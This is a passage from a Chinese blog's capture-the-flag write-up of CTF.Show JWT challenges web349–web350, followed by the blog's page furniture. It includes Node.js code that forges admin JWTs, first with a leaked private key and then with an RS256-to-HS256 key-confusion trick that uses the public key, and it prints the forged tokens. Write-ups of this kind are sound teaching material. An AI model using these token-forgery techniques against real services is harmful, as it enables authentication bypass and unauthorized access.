+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&quot;jsonwebtoken&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKeyPath = <span class="string">&quot;//Users//kelly//Downloads//private.key&quot;</span></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(privateKeyPath)</span><br><span class="line"><span class="keyword">var</span> token = jwt.sign(&#123;<span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span>&#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;)</span><br><span class="line"><span class="built_in">console</span>.log(token)</span><br></pre></td></tr></table></figure>
+
+<p>得到 token <code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzAxNjIwOTd9.npKuv9ByHR6GG5v6vVtpMcjBnfKvWKk2QpklGZEcdTvla_qNFxC6N8mjRTBE5pTUDtGLCthrUWI860hL0GfE6Yyj3hMhOvwP53KqXeGbcG4rwl3kslQ-q92TeeVoLgQW83-M855bEE5_dS_YQsVhJfqdaBKoh-j9gE2fX_bnqDI</code></p>
+<p>同时，题目要求验证的时候使用 POST，丢到 burpsuite 里面一把梭</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%207.png" alt="Untitled"></p>
+<h1 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h1><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>这题是一个白盒分析题，可以通过参数 env=development 来使其报出错误。由于压缩包里没有 private.key ，因此想要暴力破解密钥是不太可能的。同时，cookie中的auth参数提交到 index.js 后经由 jwt.verify 验证，如果 decoded 为undefined则校验失败。但经过测试，发现连它生成的jwt我直接post都没法进行到下一步，<del>所以我决定看wp</del></p>
+<blockquote>
+<p>通过将算法调整为HMAC变体（HS256/HS384/HS512）并使用公共可用公钥对其进行签名，我们可以欺骗服务使用机密变量中的硬编码公钥验证HMAC令牌。</p>
+</blockquote>
+<p>原来 JWT 在没有强制使用 RS256 的时候，还可以使用 public.key 与 HS256 来假装让它进行对称加密，真是tql。此处的public.key可以直接在网站上下载，直接输入 /public.key</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(<span class="string">&#x27;./public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token) <span class="comment">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzAxOTg2NDJ9.7_3UAT5LFXNiPgdZCH80sQYvek-lQ88py8pb9lY9HHw</span></span><br></pre></td></tr></table></figure>
+
+<p>这样下来，解题就很简单了，我们用公钥签名，然后直接把jwt交上去试试</p>
+<p>按照代码，我们这里还需要使用 POST 方式来进行请求</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%208.png" alt="Untitled"></p>
+<h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/112525267">[CTFSHOW]JWT_Y4tacker的博客-CSDN博客_ctf jwt</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html" rel="prev" title="【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128">
+      <i class="fa fa-chevron-left"></i> 【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Yang-Cheng-Bei-2021-Web-WriteUp.html" rel="next" title="羊城杯2021-网络安全大赛 Web Writeup">
+      羊城杯2021-网络安全大赛 Web Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web345"><span class="nav-number">1.</span> <span class="nav-text">web345</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">1.3.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web346"><span class="nav-number">2.</span> <span class="nav-text">web346</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">2.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-1"><span class="nav-number">2.2.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-1"><span class="nav-number">2.3.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web347"><span class="nav-number">3.</span> <span class="nav-text">web347</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-2"><span class="nav-number">3.2.</span> <span class="nav-text">做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-Python-%E8%84%9A%E6%9C%AC-%E5%B8%B8%E7%94%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-number">3.2.1.</span> <span class="nav-text">通过 Python 脚本 + 常用密码破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87-jwt-cracker-%E8%BF%9B%E8%A1%8C%E7%A0%B4%E8%A7%A3"><span class="nav-number">3.2.2.</span> <span class="nav-text">通过 jwt-cracker 进行破解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-2"><span class="nav-number">3.3.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%B5%84%E6%96%99"><span class="nav-number">4.</span> <span class="nav-text">其他资料</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web348"><span class="nav-number">5.</span> <span class="nav-text">web348</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-number">5.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-3"><span class="nav-number">5.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web349"><span class="nav-number">6.</span> <span class="nav-text">web349</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="nav-number">6.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BB%A3%E7%A0%81"><span class="nav-number">6.2.</span> <span class="nav-text">题目代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-4"><span class="nav-number">6.3.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web350"><span class="nav-number">7.</span> <span class="nav-text">web350</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-5"><span class="nav-number">7.1.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-3"><span class="nav-number">7.2.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guoguo"
+      src="https://guo.moe/favicon.jpg">
+  <p class="site-author-name" itemprop="name">Guoguo</p>
+  <div class="site-description" itemprop="description">找不到路，就自己走一条出来。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imguoguo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imguoguo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@guo.moe" title="E-Mail → mailto:blog@guo.moe"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guoguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/medium-zoom.min.js"></script>
+  <script src="/lib/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.guo.moe/api/' || 'https://disqus.com/api/',
+      apikey    : 'TRTXJqZLCwf51OCjLAd1u320K7DxrMxK37Ch9X2xFXy5Q4d2gdVBKeMT33qizKh9',
+      shortname : 'guoguoblog',
+      url       : "https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT.html",
+      identifier: "archives/CTF-Show-Get-Started-with-the-web-JWT.html",
+      title     : "【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
